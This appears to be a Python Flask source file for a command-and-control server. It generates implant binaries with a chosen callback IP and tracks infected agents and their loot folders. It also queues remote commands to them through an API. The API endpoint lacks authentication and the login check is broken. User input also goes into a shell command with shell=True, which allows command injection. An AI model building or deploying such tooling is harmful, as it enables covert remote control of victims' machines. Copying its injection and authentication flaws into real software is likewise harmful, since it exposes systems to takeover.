from datetime import datetime, timedelta
from flask import render_template, redirect, url_for, request, session, flash
from flask_wtf import FlaskForm
from functools import wraps
from wtforms import StringField
from wtforms.fields.simple import PasswordField
from werkzeug.security import check_password_hash, generate_password_hash
from c2 import app, db
from c2.models import Agent, Commands, User

import os
import subprocess


def login_required(f):
    """Requires a user to login before they can access critical endpoints

    :returns: redirects an unauthenticated user to /login
    :rtype: wrap
    """

    @wraps(f)
    def wrap(*args, **kwargs):
        if "logged_in" in session:
            return f(*args, **kwargs)
        else:
            flash("You need to login first.")
            return redirect(url_for("login"))

    return wrap


class MyForm(FlaskForm):
    """Form used to configure the main implant

    :param ip: The callback IP address
    :type ip: str
    :param sleep: The amount of the time the implant should wait to callback
    :type sleep: str
    :returns: none
    :rtype: None
    """

    ip = StringField("IP")
    sleep = StringField("Sleep Time")


class AuthForm(FlaskForm):
    """Form used to register a user"""

    email = StringField("email")
    name = StringField("name")
    password = PasswordField("password")


def build_implant(ip="127.0.0.1", sleepTime="0"):
    """Builds the binary using the user provided config values

    :param ip: The callback IP address, defaulted at localhost
    :type ip: str
    :param sleepTime: The amount of time the implant should wait to callback
    :type sleepTime: str
    :returns: none
    :rtype: None
    """
    subprocess.Popen(
        [f"../implant/payloads/make.sh -h {ip} -s {sleepTime}"], shell=True
    )


def add_agent(agent_dict):
    """Adds an agent to the backend database

    :param agent_dict: A dictionary containing all the agent information
    :type agent_dict: dict
    :returns: the ID of the new agent :rtype: int
    """
    # if not db.session.query(db.exists().where(Agent.ip == agent_dict['IP'])
    # ).scalar():
    args = [str(agent_dict["Stats"][key]) for key in agent_dict["Stats"]]
    args += [str(agent_dict["total"])]
    args += [agent_dict["IP"]]
    args += [agent_dict["USERNAME"]]
    args += [agent_dict["SleepTime"]]
    agent = Agent(*args)
    db.session.add(agent)
    db.session.flush()
    agent_id = agent.id
    print(agent_id)
    db.session.commit()
    print(agent_id)
    os.mkdir(f"loot/agent_{agent_id}")
    return agent.id


@app.route("/config", methods=["GET", "POST"])
@login_required
def generate():
    """Endpoint that contains a form allowing the user to provide values
    for a custom config and generate a new implant binary

    """
    form = MyForm()
    if request.method == "POST":
        args = [
            request.form[key] for key in request.form.keys() if request.form[key] != ""
        ]
        print(args)
        build_implant(*args)
        print("Payload Successfuly Generated!")
    return render_template("config.html", form=form)


@app.route("/bot<id>", methods=["GET"])
@login_required
def bot(id):
    """Endpoint that displays all the information regarding the
    bot with the specified ID, and includes an interactive shell.

    :param id: The ID of the agent
    :type id: str
    """
    agent = Agent.query.filter_by(id=id).first()
    print(agent)
    return render_template("bot.html", agent=agent)


@app.route("/", methods=["GET"])
@login_required
def home():
    """Endpoint that displays a pwnboard that includes all of the
    active implants calling back to the server

    """
    check_agent_alive()
    agents = db.session.query(Agent).all()
    return render_template("index.html", agents=agents)


@app.route("/api/1.1/add_command", methods=["POST"])
def add_command():
    """API endpoint that allows the bot terminal to add
    commands to the Command table in the database

    :returns: a json RPC object containing any finished jobs and the new job ID
    :rtype: dict
    """
    if request.method == "POST":
        json = request.json
        if json is None:
            return "Bad request"
        command = json["params"]
        implantID = json["method"][4:]
        new_comm = Commands(implantID=implantID, command=command)
        db.session.add(new_comm)
        db.session.flush()
        db.session.commit()
        db.session.refresh(new_comm)
        res = Commands.query.filter(
            Commands.implantID == implantID,
            Commands.retrieved == True,
            Commands.displayed == False,
        ).first()
        output = f"[+] new job started with id {new_comm.commandID}"
        if res is not None and res.output is not None:
            res.displayed = True
            output += f"\n[*] job with id {res.commandID} \
                        finished with output: \n{res.output}"
            db.session.flush()
            db.session.commit()
        rpc = {}
        rpc["result"] = output
        rpc["jsonrpc"] = json["jsonrpc"]
        rpc["id"] = json["id"]
        return rpc


@app.route("/welcome", methods=["GET"])
def welcome():
    return render_template("welcome.html")


@app.route("/login", methods=["GET", "POST"])
def login():
    """Endpoint that allows a user to login and authenticate
    themselves with the server

    """
    error = None
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        user = User.query.filter(username == username).first()
        if not user:
            error = "Account not found"
        elif not check_password_hash(user.password, password):
            error = "Invalid credentials. Please try again."
        else:
            session["logged_in"] = True
            flash("You were just logged in!")
            return redirect(url_for("home"))
    return render_template("login.html", error=error)


@app.route("/logout", methods=["GET"])
@login_required
def logout():
    """Endpoint that allows a user to logout of their session"""
    session.pop("logged_in", None)
    flash("You were just logged out!")
    return redirect(url_for("welcome"))


@app.route("/signup", methods=["GET", "POST"])
def signup():
    """Endpoint that allows a user to register an account"""
    form = AuthForm()

    if request.method == "POST":
        email = request.form["email"]
        name = request.form["name"]
        password = request.form["password"]

        user = User.query.filter_by(email=email).first()

        if user:
            return "BINGUS: ALREADY REGISTERED"

        new_user = User(
            email=email,
            name=name,
            password=generate_password_hash(password, method="sha256"),
        )

        db.session.add(new_user)
        db.session.commit()
        return redirect(url_for("login"))

    return render_template("signup.html", form=form)


def check_agent_alive():
    agents = db.session.query(Agent).all()
    for agent in agents:
        last_seen = agent.lastSeen
        last_seen = datetime.strptime(last_seen, "%d %B, %Y %H:%M:%S")
        curr_time = datetime.now()
        elapsed = curr_time - last_seen
        agent_expected = timedelta(seconds=(agent.sleepTime * 2))
        if elapsed > agent_expected:
            agent.isAlive = False
        else:
            agent.isAlive = True
        db.session.flush()
        db.session.commit()


if __name__ == "__main__":
    """Runs the base flask app, only use for debugging,
    otherwise use the preferred method in README.md

    """
    app.run(host="0.0.0.0")
